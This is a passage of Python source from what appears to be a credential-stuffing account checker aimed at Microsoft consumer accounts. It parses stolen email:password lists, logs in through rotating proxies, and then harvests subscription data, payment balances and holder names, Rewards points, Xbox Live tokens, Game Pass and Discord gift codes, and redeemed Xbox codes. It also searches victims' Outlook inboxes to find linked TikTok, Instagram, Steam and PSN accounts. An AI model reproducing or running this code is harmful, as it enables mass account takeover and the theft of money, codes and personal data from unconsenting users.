    "Tumblr":["tumblr.com"],
    "WeChat":["wechat.com"],
    "Line":["line.me"],
    "Viber":["viber.com"],
    "Kik":["kik.com"],
    "Skype":["skype.com"],
    "Zoom":["zoom.us"],
    "Mastodon":["mastodon.social"],
    "Threads":["threads.net"],
    "BeReal":["bereal.com"],
    "Clubhouse":["clubhouse.com"],
    "Twitch":["twitch.tv"],
    "YouTube":["youtube.com"],
    "Vimeo":["vimeo.com"],
    "Dailymotion":["dailymotion.com"],
    "Quora":["quora.com"],
    "Medium":["medium.com"],
    "Substack":["substack.com"],
    "Patreon":["patreon.com"],
    "Ko-fi":["ko-fi.com"],
    "OnlyFans":["onlyfans.com"],
    "Meetup":["meetup.com"],
    "Yelp":["yelp.com"],
    "9GAG":["9gag.com"],
    "Netflix":["netflix.com","mailer.netflix.com"],
    "Spotify":["spotify.com"],
    "Hulu":["hulu.com"],
    "Disney+":["disney.com","disneyplus.com"],
    "HBO Max":["hbomax.com","warnermedia.com"],
    "Prime Video":["primevideo.com","amazon.com"],
    "Apple TV+":["apple.com"],
    "Crunchyroll":["crunchyroll.com"],
    "Peacock":["peacocktv.com"],
    "Paramount+":["paramount.com"],
    "Funimation":["funimation.com"],
    "DAZN":["dazn.com"],
    "ESPN+":["espnplus.com"],
    "Plex":["plex.tv"],
    "Emby":["emby.media"],
    "Xbox Live":["xbox.com","xboxlive.com"],
    "PlayStation":["playstation.com","sony.com","txn-email.playstation.com","email02.account.sony.com"],
    "Steam":["steampowered.com","valvesoftware.com"],
    "Epic Games":["epicgames.com"],
    "Riot Games":["riotgames.com"],
    "Nintendo":["nintendo.com"],
    "Minecraft":["mojang.com","minecraft.net"],
    "Supercell":["supercell.com","supercell.net"],
    "Roblox":["roblox.com"],
    "EA/Origin":["ea.com","origin.com"],
    "Ubisoft":["ubisoft.com"],
    "Battle.net":["battle.net","blizzard.com"],
    "GOG":["gog.com"],
    "Activision":["activision.com"],
    "Rockstar":["rockstargames.com"],
    "Bethesda":["bethesda.net"],
    "2K Games":["2k.com"],
    "Bandai Namco":["bandainamco.com"],
    "SEGA":["sega.com"],
    "Square Enix":["square-enix.com"],
    "Capcom":["capcom.com"],
    "Konami":["konami.com"],
    "Valve":["valvesoftware.com"],
    "Wargaming":["wargaming.net"],
    "Gameloft":["gameloft.com"],
    "Garena":["garena.com"],
    "Midasbuy":["midasbuy.com"],
    "Amazon":["amazon.com","amazon.co.uk","amazon.de"],
    "eBay":["ebay.com"],
    "AliExpress":["aliexpress.com"],
    "Wish":["wish.com"],
    "Etsy":["etsy.com"],
    "Walmart":["walmart.com"],
    "Target":["target.com"],
    "Shopify":["shopify.com"],
    "Mercari":["mercari.com"],
    "PayPal":["paypal.com"],
    "Venmo":["venmo.com"],
    "Cash App":["cash.app","square.com"],
    "Zelle":["zellepay.com"],
    "Stripe":["stripe.com"],
    "Binance":["binance.com"],
    "Coinbase":["coinbase.com"],
    "Kraken":["kraken.com"],
    "Crypto.com":["crypto.com"],
    "KuCoin":["kucoin.com"],
    "Gemini":["gemini.com"],
    "OKX":["okx.com"],
    "Bybit":["bybit.com"],
    "Revolut":["revolut.com"],
    "Wise":["wise.com"],
    "Skrill":["skrill.com"],
    "Neteller":["neteller.com"],
    "Payoneer":["payoneer.com"],
    "Robinhood":["robinhood.com"],
    "eToro":["etoro.com"],
    "Google":["google.com","gmail.com"],
    "Apple":["apple.com","icloud.com"],
    "Microsoft":["microsoft.com","live.com","hotmail.com","outlook.com"],
    "Dropbox":["dropbox.com"],
    "GitHub":["github.com"],
    "GitLab":["gitlab.com"],
    "Adobe":["adobe.com"],
    "Canva":["canva.com"],
    "Figma":["figma.com"],
    "Notion":["notion.so"],
    "Slack":["slack.com"],
    "Asana":["asana.com"],
    "Trello":["trello.com"],
    "Coursera":["coursera.com"],
    "Udemy":["udemy.com"],
    "LinkedIn Learning":["lil.ms"],
    "Skillshare":["skillshare.com"],
    "Duolingo":["duolingo.com"],
    "Tinder":["gotinder.com"],
    "Bumble":["bumble.com"],
    "Hinge":["hinge.co"],
    "Match":["match.com"],
    "Airbnb":["airbnb.com"],
    "Booking.com":["booking.com"],
    "Uber":["uber.com"],
    "Lyft":["lyft.com"],
    "DoorDash":["doordash.com"],
    "Grubhub":["grubhub.com"],
    "Uber Eats":["ubereats.com"],
    "Instacart":["instacart.com"],
    "OxyLabs":["oxylabs.io"],
    "Bright Data":["brightdata.com"],
    "SmartProxy":["smartproxy.com"],
    "IPRoyal":["iproyal.com"],
    "ProxyEmpire":["proxyempire.io"],
    "LunaProxy":["lunaproxy.com"],
    "Flamingo Proxies":["flamingoproxies.com"],
}

_GAMES = {
    'Steam','Xbox Live','PlayStation','Nintendo','Epic Games','EA/Origin','Ubisoft',
    'Activision','Battle.net','Riot Games','Roblox','Minecraft','Supercell',
    'Garena','Midasbuy','GOG','Rockstar','Bethesda','2K Games','Wargaming','Gameloft',
    'Bandai Namco','SEGA','Square Enix','Capcom','Konami','Valve',
}

_SOCIAL = {
    'Facebook','Instagram','TikTok','Twitter/X','Snapchat','LinkedIn','Pinterest',
    'Reddit','Discord','Telegram','WhatsApp','WeChat','Line','Viber','Kik',
    'Skype','Mastodon','Threads','BeReal','Clubhouse','Twitch','YouTube',
    'Quora','Medium','Substack','Patreon','Ko-fi','OnlyFans','Meetup','Yelp','9GAG',
}

_PAYMENT = {
    'PayPal','Venmo','Cash App','Zelle','Stripe','Binance','Coinbase','Kraken',
    'Crypto.com','KuCoin','Gemini','OKX','Bybit','Revolut','Wise','Skrill',
    'Neteller','Payoneer','Robinhood','eToro',
}

_PROXY_SVC = {
    'OxyLabs','Bright Data','SmartProxy','IPRoyal','ProxyEmpire','LunaProxy','Flamingo Proxies',
}

_SOCIAL_LINK_PLATFORMS = {'TikTok','Instagram','Facebook','Twitter/X'}

_SOCIAL_LINK_TMPL = {
    "TikTok":    "https://www.tiktok.com/@{u}",
    "Instagram": "https://www.instagram.com/{u}/",
    "Facebook":  "https://www.facebook.com/{u}",
    "Twitter/X": "https://twitter.com/{u}",
}

def _service_folder(svc: str) -> str:
    if svc in _GAMES: return "Games"
    if svc in _SOCIAL: return "Social"
    if svc in _PAYMENT: return "Payment"
    if svc in _PROXY_SVC: return "Proxy"
    if svc == "PlayStation": return "PSN"
    return "Apps"

def classify_svc(name):
    nl = name.lower()
    if "game pass ultimate" in nl: return "xgpu"
    if "game pass" in nl and "essential" in nl: return "xgpe"
    if "game pass" in nl: return "xgpp"
    if "365" in nl or "office" in nl: return "m365"
    return "other_svc"

def fmt_svc(sv):
    if isinstance(sv, dict):
        parts=[f"[{sv.get('cat','?')}] {sv.get('name','?')}"]
        if sv.get("days") is not None: parts.append(f"Days: {sv['days']}")
        if sv.get("auto") is not None: parts.append(f"AutoRenew: {'YES' if sv['auto'] else 'NO'}")
        if sv.get("expiry"): parts.append(f"Expires: {sv['expiry'].strftime('%Y-%m-%d')}")
        if sv.get("billing") is not None:
            b=str(sv["billing"])
            if sv.get("bill_curr"): b+=f" {sv['bill_curr']}"
            parts.append(f"Billing: {b}")
        return " | ".join(parts)
    return f"[{sv}]"

def parse_combos(lines_list):
    combos=[]; bad=0; total=len(lines_list)
    for line in lines_list:
        line=line.strip()
        if not line: bad+=1; continue
        skip=any(p.match(line) for p in SKIP_RE)
        if skip: bad+=1; continue
        match=re.search(r'^([^\s:]+@[^\s:]+\.[^\s:]+):(.+)$',line)
        if not match: bad+=1; continue
        email,pwd=match.group(1).strip(),match.group(2).strip()
        if not email or not pwd or "@" not in email: bad+=1; continue
        combos.append((email,pwd))
    return combos,total,bad

# ══════════════════════════════════════════════════════════
#  MS LOGIN ENGINE (DC bot real implementation)
# ══════════════════════════════════════════════════════════

def ms_login(email, pwd, pxr_inst):
    """Returns (sess, status_str, access_token, cid)
       status: 'OK' | 'BAD' | '2FA' | 'ERROR'
    """
    sess = requests.Session()
    px = pxr_inst.get() if pxr_inst else None
    if px: sess.proxies = px
    try:
        r1 = sess.get(
            "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email,
            headers={"User-Agent":"Dalvik/2.1.0","X-CorrelationId":str(uuid.uuid4())},timeout=12)
        if r1.status_code != 200: return sess,"ERROR",None,None
        if any(x in r1.text for x in ["Neither","Both","Placeholder","OrgId"]): return sess,"BAD",None,None
        if "MSAccount" not in r1.text: return sess,"BAD",None,None

        r2 = sess.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1&login_hint="+email+
            "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent":UA},allow_redirects=True,timeout=12)
        um=re.search(r'urlPost":"([^"]+)"',r2.text)
        pm=re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"',r2.text)
        if not um or not pm: return sess,"ERROR",None,None
        post_url=_clean(um.group(1).replace("\\/","/"))
        ppft=pm.group(1)

        r3=sess.post(post_url,
            data=("i13=1&login="+email+"&loginfmt="+email+
                  "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd="+
                  pwd+"&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx="
                  "&hpgrequestid=&PPFT="+ppft+
                  "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
                  "&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"),
            headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":UA,
                     "Origin":"https://login.live.com","Referer":r2.url},
            allow_redirects=False,timeout=12)

        loc=_clean(r3.headers.get("Location",""))
        iss=_issue(loc,r3.text)
        if iss: return sess,iss,None,None

        if not loc and _dosubmit(r3.text):
            r3f=_form_sub(sess,r3)
            iss=_issue(r3f.url,r3f.text)
            if iss: return sess,iss,None,None
            loc=r3f.url

        if not loc:
            nm=re.search(r'navigate\("([^"]+)"\)',r3.text)
            if nm: loc=_clean(nm.group(1))

        code=None
        if loc:
            iss=_issue(loc)
            if iss: return sess,iss,None,None
            cm=re.search(r'code=([^&]+)',loc)
            if cm: code=cm.group(1)

        if not code: return sess,"BAD",None,None

        cid=sess.cookies.get("MSPCID","")
        if cid: cid=cid.upper()

        tr=sess.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=("client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                  "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                  "&grant_type=authorization_code&code="+code+
                  "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"),
            headers={"Content-Type":"application/x-www-form-urlencoded"},timeout=12)

        access_token=None
        if tr.status_code==200 and "access_token" in tr.text:
            try: access_token=tr.json().get("access_token")
            except: pass

        if not cid:
            cid=sess.cookies.get("MSPCID","")
            if cid: cid=cid.upper()

        bh={"User-Agent":UA,"Accept":"text/html,*/*"}
        try:
            _follow(sess,sess.get(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                "?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-client-signin-oauth"
                "&response_type=code&scope=openid%20profile%20offline_access"
                "&prompt=none&login_hint="+email,
                headers=bh,allow_redirects=True,timeout=15))
        except: pass

        try:
            _follow(sess,sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000044199E82&scope=service::account.microsoft.com::MBI_SSL"
                "&response_type=token&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin"
                "&prompt=none&login_hint="+email,
                headers=bh,allow_redirects=True,timeout=15))
        except: pass

        if px: pxr_inst.ok(px)
        return sess,"OK",access_token,cid

    except PROXY_EXC:
        if px: pxr_inst.fail(px)
        return sess,"ERROR",None,None
    except:
        return sess,"ERROR",None,None


def _extract_svcs(html):
    m=re.search(r'JSON\.stringify\((\{"summaryData":\{"isOperationSuccessful".+?\})\)\s*;',html,re.DOTALL)
    if not m:
        for m2 in re.finditer(r'JSON\.stringify\((\{.+?\})\)\s*[;,]',html,re.DOTALL):
            try:
                o=json.loads(m2.group(1))
                if isinstance(o,dict) and "summaryData" in o:
                    m=m2; break
            except: pass
    if not m: return []
    try: data=json.loads(m.group(1))
    except: return []
    sm=data.get("summaryData",data); svcs=[]
    for key,label in [("active","ACTIVE"),("trial","TRIAL"),("canceled","CANCELED"),
                      ("commercial","COMMERCIAL"),("perpetual","PERPETUAL"),
                      ("expired","EXPIRED"),("pending","PENDING")]:
        for it in (sm.get(key) or []):
            if not isinstance(it,dict): continue
            svcs.append({"cat":label,"name":it.get("name") or it.get("displayName") or "Unknown",
                         "days":None,"auto":None,"expiry":None,"billing":None,"bill_curr":None,"trial":bool(it.get("isTrial"))})
    return svcs

def _enrich(sess, svcs):
    try:
        r=sess.get("https://account.microsoft.com/services/api/subscriptions",
                   headers={"User-Agent":UA,"Accept":"application/json","Referer":"https://account.microsoft.com/services"},timeout=10)
        if r.status_code!=200: return svcs
        data=r.json()
        items=data if isinstance(data,list) else None
        if not items and isinstance(data,dict):
            for k in ["subscriptions","active","items","data","value"]:
                if k in data and isinstance(data[k],list):
                    items=data[k]; break
        if not items: return svcs
        def scan(obj,keys):
            if isinstance(obj,dict):
                for k in keys:
                    if k in obj and obj[k]: return obj[k]
                for v in obj.values():
                    r2=scan(v,keys)
                    if r2: return r2
            elif isinstance(obj,list):
                for i in obj:
                    r2=scan(i,keys)
                    if r2: return r2
            return None
        def pdate(v):
            if not v: return None
            s2=str(v).strip()
            for fmt in ["%Y-%m-%dT%H:%M:%SZ","%Y-%m-%dT%H:%M:%S.%fZ","%Y-%m-%dT%H:%M:%S","%Y-%m-%d"]:
                try: return datetime.strptime(s2[:19],fmt[:len(s2[:19])])
                except: pass
            return None
        for it in items:
            if not isinstance(it,dict): continue
            iname=(it.get("name") or it.get("displayName") or "").lower()
            matched=None
            for sv in svcs:
                if sv["name"].lower() in iname or iname in sv["name"].lower():
                    matched=sv; break
            if not matched: continue
            v=scan(it,["endDate","expirationDate","expiryDate","subscriptionEndDate"])
            if v:
                dt=pdate(v)
                if dt:
                    matched["expiry"]=dt
                    now=datetime.now(timezone.utc)
                    if dt.tzinfo is None: dt=dt.replace(tzinfo=timezone.utc)
                    matched["days"]=(dt-now).days
            if matched["days"] is None:
                v=scan(it,["nextBillingDate","renewalDate","nextRenewalDate"])
                if v:
                    dt=pdate(v)
                    if dt:
                        now=datetime.now(timezone.utc)
                        if dt.tzinfo is None: dt=dt.replace(tzinfo=timezone.utc)
                        matched["days"]=(dt-now).days; matched["expiry"]=dt
            v=scan(it,["amount","price","billingAmount","totalAmount"])
            if v is not None: matched["billing"]=v
            v=scan(it,["currency","currencyCode"])
            if v: matched["bill_curr"]=v
            v=scan(it,["autoRenew","isAutoRenewEnabled"])
            if v is not None: matched["auto"]=bool(v)
    except: pass
    return svcs

def check_services(sess, email):
    bh={"User-Agent":UA,"Accept":"text/html,*/*"}
    try:
        r6=_follow(sess,sess.get("https://account.microsoft.com/services?ref=xboxme",headers=bh,allow_redirects=True,timeout=15))
        if "complete-sso" in r6.url:
            sm=re.search(r'complete-sso-with-redirect\?state=[^"\'&\s]+',r6.text)
            if sm:
                r6=_follow(sess,sess.get("https://account.microsoft.com/auth/"+sm.group(0),headers=bh,allow_redirects=True,timeout=15))
        if "login" in r6.url.lower() and "account.microsoft.com/services" not in r6.url:
            r6=_follow(sess,sess.get("https://account.microsoft.com/services",headers=bh,allow_redirects=True,timeout=15))
        svcs=_extract_svcs(r6.text)
        svcs=_enrich(sess,svcs)
        return svcs
    except: return []

def check_balance(sess):
    try:
        uid=str(uuid.uuid4()).replace('-','')[:16]
        state_val=json.dumps({"userId":uid,"scopeSet":"pidl"})
        r=sess.get(
            "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A"
            "&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
            "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
            "&state="+quote(state_val)+"&prompt=none",
            headers={"User-Agent":UA,"Referer":"https://account.microsoft.com/"},
            allow_redirects=True,timeout=15)
        tk=None
        for p in [r'access_token=([^&\s"\']+)',r'"access_token":"([^"]+)"']:
            m=re.search(p,r.text+" "+r.url)
            if m: tk=unquote(m.group(1)); break
        if not tk: return None,None,None
        rp=sess.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
            headers={"User-Agent":UA,"Accept":"application/json","Authorization":f'MSADELEGATE1.0="{tk}"',
                     "Origin":"https://account.microsoft.com"},timeout=12)
        if rp.status_code!=200: return None,None,None
        txt=rp.text; bal,cur,holder=None,None,None
        bm=re.search(r'"balance"\s*:\s*([0-9.]+)',txt)
        if bm: bal=float(bm.group(1))
        cm=re.search(r'"currency"\s*:\s*"([^"]+)"',txt)
        if cm: cur=cm.group(1)
        hm=re.search(r'"accountHolderName"\s*:\s*"([^"]+)"',txt)
        if hm: holder=hm.group(1)
        return bal,cur,holder
    except: return None,None,None

def check_rp(sess):
    try:
        bh={"User-Agent":UA}
        try:
            ra=sess.get(
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=0000000040170455&scope=service::bing.com::MBI_SSL"
                "&response_type=token"
                "&redirect_uri=https%3A%2F%2Fwww.bing.com%2Ffd%2Fauth%2Fsignin%3Faction%3Dinteractive"
                "&prompt=none",headers=bh,allow_redirects=True,timeout=12)
            if _dosubmit(ra.text): _form_sub(sess,ra)
        except: pass
        time.sleep(0.3)
        r=sess.get("https://rewards.bing.com/dashboard",headers=bh,allow_redirects=True,timeout=15)
        if _dosubmit(r.text): r=_form_sub(sess,r)
        pg=r.text; pts=None
        for p in [r'"availablePoints"\s*:\s*(\d+)',r'availablePoints["\s:=]+(\d+)',r'"redeemable"\s*:\s*(\d+)']:
            m=re.search(p,pg)
            if m:
                try: pts=int(m.group(1).replace(',','')); break
                except: pass
        if pts is None:
            try:
                ar=sess.get("https://rewards.bing.com/api/getuserinfo?type=1",
                            headers={"User-Agent":UA,"Referer":"https://rewards.bing.com/dashboard"},timeout=10)
                m=re.search(r'"availablePoints"\s*:\s*(\d+)',ar.text)
                if m: pts=int(m.group(1))
            except: pass
        return pts
    except: return None

def get_xbl(sess):
    try:
        r=sess.get(
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en&prompt=none",
            headers={"User-Agent":UA},allow_redirects=True,timeout=12)
        if _dosubmit(r.text): r=_form_sub(sess,r)
        tm=re.search(r'access_token=([^&]+)',r.url)
        if not tm: return None
        rps=tm.group(1)
        xh={"User-Agent":UA,"Content-Type":"application/json","x-xbl-contract-version":"1"}
        ur=sess.post("https://user.auth.xboxlive.com/user/authenticate",headers=xh,
                     json={"Properties":{"AuthMethod":"RPS","RpsTicket":rps,"SiteName":"user.auth.xboxlive.com"},
                           "RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"},timeout=10)
        if ur.status_code!=200: return None
        ut=ur.json().get("Token")
        if not ut: return None
        xr=sess.post("https://xsts.auth.xboxlive.com/xsts/authorize",headers=xh,
                     json={"Properties":{"SandboxId":"RETAIL","UserTokens":[ut]},
                           "RelyingParty":"http://xboxlive.com","TokenType":"JWT"},timeout=10)
        d=xr.json()
        if "Token" not in d: return None
        return f"XBL3.0 x={d['DisplayClaims']['xui'][0]['uhs']};{d['Token']}"
    except: return None

def extract_promo_codes(text):
    found=[]; seen=set()
    discord_patterns=[
        r'https?://(?:discord\.gift|discord\.com/gifts|promos\.discord\.gg|discordapp\.com/gifts|discord\.com/billing/promotions)/([A-Za-z0-9_-]+)',
        r'https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/(?:gifts|billing/promotions)/([A-Za-z0-9_-]+)',
    ]
    for pat in discord_patterns:
        for m in re.finditer(pat,text,re.I):
            full=m.group(0).strip('"').strip("'")
            if full not in seen:
                seen.add(full); found.append(("DISCORD_PROMO",full))
    for m in re.finditer(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}',text):
        val=m.group()
        if val not in seen:
            seen.add(val); found.append(("XBOX_CODE",val))
    for m in re.finditer(r'https?://[^\s"\'<>]+(?:redeem|gift|promo|nitro)[^\s"\'<>]*',text,re.I):
        url=m.group()
        if url not in seen:
            seen.add(url); found.append(("REDEEM_URL",url))
    return found

def check_discord(sess, xbl, pxr_inst):
    found=[]
    if not xbl: return found
    ah={"authorization":xbl,"User-Agent":UA,"Accept":"application/json","Content-Type":"application/json"}
    endpoints=[
        ("POST","https://profile.gamepass.com/v2/offers/A3525E6D4370403B9763BCFA97D383D9/"),
        ("GET","https://profile.gamepass.com/v1/perks"),
        ("GET","https://profile.gamepass.com/v2/perks"),
        ("GET","https://profile.gamepass.com/v1/perks/active"),
        ("GET","https://profile.gamepass.com/v2/perks/active"),
    ]
    all_codes=[]
    for meth,url in endpoints:
        try:
            px=pxr_inst.get() if pxr_inst else None
            resp=None
            for attempt in range(MAX_RETRIES):
                try:
                    if meth=="GET": resp=sess.get(url,headers=ah,proxies=px or {},timeout=15)
                    else: resp=sess.post(url,headers=ah,proxies=px or {},timeout=15)
                    if resp.status_code==200:
                        if px and pxr_inst: pxr_inst.ok(px)
                        break
                    elif resp.status_code==429: time.sleep(3*(attempt+1)); continue
                    else: resp=None; break
                except PROXY_EXC:
                    if px and pxr_inst: pxr_inst.fail(px)
                    time.sleep(2); px=pxr_inst.get() if pxr_inst else None; resp=None; continue
                except: resp=None; break
            if resp is None: continue
            codes=extract_promo_codes(resp.text)
            for ctype,cval in codes:
                if (ctype,cval) not in [(c[0],c[1]) for c in all_codes]:
                    all_codes.append((ctype,cval,url))
        except: continue
    discord_promos=[c for c in all_codes if c[0] in ("DISCORD_PROMO","REDEEM_URL")]
    for ctype,cval,src in discord_promos:
        if cval not in [x[0] for x in found]:
            found.append((cval,"FOUND"))
    return found

def disc_status(link, pxr_inst):
    try:
        m=re.search(r'/([A-Za-z0-9_-]+)$',link)
        if not m: return "invalid"
        code=m.group(1)
        for attempt in range(MAX_RETRIES):
            current_proxy=None
            try:
                current_proxy=pxr_inst.get() if pxr_inst else None
                r=requests.get(
                    f"https://discord.com/api/v10/entitlements/gift-codes/{code}",
                    headers={"User-Agent":UA,"Accept":"application/json"},
                    proxies=current_proxy,timeout=10)
                if r.status_code==200:
                    data=r.json()
                    if data.get("revoked",False): return "claimed"
                    expires_at=data.get("expires_at")
                    if expires_at:
                        try:
                            exp_time=datetime.fromisoformat(expires_at.replace("Z","+00:00"))
                            if exp_time<datetime.now(timezone.utc): return "expired"
                        except: pass
                    if data.get("uses",0)>=data.get("max_uses",1): return "claimed"
                    return "unclaimed"
                elif r.status_code==404: return "invalid"
                elif r.status_code==429:
                    retry_after=r.json().get("retry_after",5) if r.text else 5
                    time.sleep(retry_after); continue
                elif r.status_code>=500: time.sleep(2); continue
                else: return "unknown"
            except PROXY_EXC:
                if current_proxy and pxr_inst: pxr_inst.fail(current_proxy)
                time.sleep(2); continue
            except: return "unknown"
        return "unknown"
    except: return "unknown"

def check_xbox_codes(sess):
    codes=[]
    try:
        bh={"User-Agent":UA,"Referer":"https://rewards.bing.com/"}
        r=sess.get("https://rewards.bing.com/redeem/orderhistory",headers=bh,allow_redirects=True,timeout=15)
        if _dosubmit(r.text):
            r=_form_sub(sess,r)
            r=sess.get("https://rewards.bing.com/redeem/orderhistory",headers=bh,allow_redirects=True,timeout=15)
        soup=BeautifulSoup(r.text,'html.parser')
        vt=""
        ti=soup.find('input',attrs={'name':'__RequestVerificationToken'})
        if ti and ti.get('value'): vt=ti['value']
        table=soup.find('table',class_='table')
        if not table: return codes
        for row in table.find_all('tr'):
            cells=row.find_all(['td','th'])
            if len(cells)<3: continue
            btn=row.find('button',id=lambda x:x and x.startswith('OrderDetails_'))
            if not btn: continue
            aurl=btn.get('data-actionurl','').replace('&amp;','&')
            title=cells[2].get_text(strip=True) if len(cells)>2 else ""
            if any(kw in title.lower() for kw in ['gift card','amazon','walmart','target','visa']): continue
            if aurl:
                if aurl.startswith('/'): aurl='https://rewards.bing.com'+aurl
                try:
                    pd={}
                    if vt: pd['__RequestVerificationToken']=vt
                    cr=sess.post(aurl,data=pd,headers={"User-Agent":UA,"X-Requested-With":"XMLHttpRequest"},timeout=10)
                    m=XCODE_RE.search(cr.text)
                    if m: codes.append((m.group(),title))
                except: pass
    except: pass
    return codes

# ══════════════════════════════════════════════════════════
#  INBOX ENGINE — search helpers
# ══════════════════════════════════════════════════════════

def _search_mail(sess, access_token, cid, query):
    if not access_token or not cid: return 0
    try:
        payload={
            "Cvid":str(uuid.uuid4()),"Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off",
            "EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],
                "Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}}]},
                "From":0,"Query":{"QueryString":query},"Size":50,"Sort":[{"Field":"Time","SortDirection":"Desc"}]}]
        }
        headers={'User-Agent':'Outlook-Android/2.0','Accept':'application/json',
                 'Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{cid}','Content-Type':'application/json'}
        r=sess.post("https://outlook.live.com/search/api/v2/query",json=payload,headers=headers,timeout=15)
        if r.status_code==200:
            data=r.json()
            if 'EntitySets' in data and data['EntitySets']:
                es=data['EntitySets'][0]
                if 'ResultSets' in es and es['ResultSets']:
                    return es['ResultSets'][0].get('Total',0)
        return 0
    except: return 0

def _search_tiktok_inbox(sess, access_token, cid):
    count=_search_mail(sess,access_token,cid,"account.tiktok.com OR tiktok.com")
    if count==0: return None
    try:
        payload={
            "Cvid":str(uuid.uuid4()),"Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off",
            "EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],
                "Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}}]},
                "From":0,"Query":{"QueryString":"account.tiktok.com OR tiktok"},"Size":10,
                "Sort":[{"Field":"Time","SortDirection":"Desc"}]}]
        }
        headers={'User-Agent':'Outlook-Android/2.0','Accept':'application/json',
                 'Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{cid}','Content-Type':'application/json'}
        r=sess.post("https://outlook.live.com/search/api/v2/query",json=payload,headers=headers,timeout=15)
        username=None
        if r.status_code==200:
            txt=r.text
            for pat in [r'tiktok\.com/@([a-zA-Z0-9_.]{3,30})',r'"uniqueId"\s*:\s*"([a-zA-Z0-9_.]{3,30})"']:
                m=re.search(pat,txt,re.IGNORECASE)
                if m: username=m.group(1); break
        return {'username':username,'emails_count':count} if username else None
    except: return None

def _search_instagram_inbox(sess, access_token, cid):
    count=_search_mail(sess,access_token,cid,"mail.instagram.com OR @instagram.com OR instagram")
    if count==0: return None
    try:
        payload={
            "Cvid":str(uuid.uuid4()),"Scenario":{"Name":"owa.react"},"TimeZone":"UTC","TextDecorations":"Off",
            "EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],
                "Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}}]},
                "From":0,"Query":{"QueryString":"instagram"},"Size":10,
                "Sort":[{"Field":"Time","SortDirection":"Desc"}]}]
        }
        headers={'User-Agent':'Outlook-Android/2.0','Accept':'application/json',
                 'Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{cid}','Content-Type':'application/json'}
        r=sess.post("https://outlook.live.com/search/api/v2/query",json=payload,headers=headers,timeout=15)
        username=None
        if r.status_code==200:
            txt=r.text
            for pat in [r'instagram\.com/([a-zA-Z0-9_.]{3,30})/?',r'"username"\s*:\s*"([a-zA-Z0-9_.]{3,30})"']:
                for m in re.finditer(pat,txt,re.IGNORECASE):
                    u=m.group(1)
                    if not any(x in u.lower() for x in ['email','mail','account','support','noreply']):
                        username=u; break
                if username: break
        return {'username':username,'emails_count':count} if username else None
    except: return None

def check_psn(sess, access_token, cid):
    return _search_mail(sess,access_token,cid,"sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation")

def check_steam(sess, access_token, cid):
    return _search_mail(sess,access_token,cid,"noreply@steampowered.com OR steam")

def check_supercell(sess, access_token, cid):
    found_games=[]
    for game in ["Clash of Clans","Clash Royale","Brawl Stars","Hay Day","Boom Beach"]:
        try:
            count=_search_mail(sess,access_token,cid,game)
            if count>0: found_games.append(game)
            time.sleep(0.2)
        except: continue
    return found_games

def check_tiktok(sess, access_token, cid):
    try:
        inbox_result=_search_tiktok_inbox(sess,access_token,cid)
        if not inbox_result or not inbox_result.get('username'): return None
        username=inbox_result['username']; emails_count=inbox_result.get('emails_count',0)
        profile=_get_tiktok_profile(sess,username)
        if not profile: profile=_get_tiktok_profile_web(username)
        if profile:
            return {'username':username,'emails_count':emails_count,
                    'full_name':profile.get('nickname','N/A'),'followers':profile.get('followers',0),
                    'following':profile.get('following',0),'likes':profile.get('likes',0),
                    'videos':profile.get('videos',0),'verified':profile.get('verified',False),
